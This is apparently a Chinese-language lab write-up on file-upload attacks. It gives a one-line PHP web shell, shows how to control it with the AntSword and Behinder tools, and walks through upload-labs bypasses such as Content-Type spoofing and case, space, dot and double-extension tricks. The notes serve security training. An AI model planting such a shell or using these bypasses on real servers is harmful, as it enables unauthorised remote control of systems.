## 1.利用post型小马进行漏洞利用

### 编写post小马并上传

```php
<?php eval(@$_POST['cmd']); ?>
```

### 然后访问服务端的木马文件并使用post传参

![image-20221209143053896](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209143053896.png)

## 2.利用蚁剑进行服务器权限控制

### 下载蚁剑[源代码](https://github.com/AntSwordProject/antSword)和[加载器](https://github.com/AntSwordProject/AntSword-Loader)安装并打开

![image-20221209143342919](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209143342919.png)

### 使用蚁剑添加数据

![image-20221209143612266](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209143612266.png)

> 连接密码即为![image-20221209143513183](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209143513183.png)

### 成功连接

![image-20221209143704107](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209143704107.png)

![image-20221209143730942](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209143730942.png)

## 3.利用冰蝎进行服务器权限控制

### 下载[冰蝎](https://github.com/rebeyond/Behinder)

![image-20221209144421098](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209144421098.png)

### 将webshell上传到服务器后添加数据即可连接

![image-20221209144506120](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209144506120.png)

## 4.完成upload-labs1,2,11,6,8

### Pass-01

#### 利用JavaScript检测后缀

![image-20221209150114197](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209150114197.png)

#### 上传时候禁用JavaScript即可绕过

![image-20221209150214619](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209150214619.png)

#### 成功访问

![image-20221209150540969](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209150540969.png)

### Pass-02

#### 分析代码可知对`Content-Type`添加判断

![image-20221209150818508](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209150818508.png)

#### 抓包修改`Content-Type`并上传

![image-20221209151048428](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209151048428.png)

#### 成功访问

![image-20221209151239894](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209151239894.png)

### Pass-06

#### 分析代码可知使用黑名单验证文件后缀，但没有统一大小写

![image-20221209185635303](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209185635303.png)

#### 使用大写后缀名绕过

![image-20221209185743213](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209185743213.png)

### Pass-07

#### 分析代码可知使用黑名单验证文件后缀，但没有去除空格

![image-20221209151422546](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209151422546.png)

#### 抓包添加空格绕过

![image-20221209185116841](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209185116841.png)

### Pass-08

#### 分析代码可知使用黑名单验证文件后缀，但没有去除`.`

![image-20221209185829301](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209185829301.png)

#### 添加`.`绕过

![image-20221209185918032](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209185918032.png)

### Pass-11

#### 分析代码可知根据黑名单将非法后缀替换为空

![image-20221209185954087](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209185954087.png)

#### 修改双写绕过

![image-20221209190050897](http://bex-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221209190050897.png)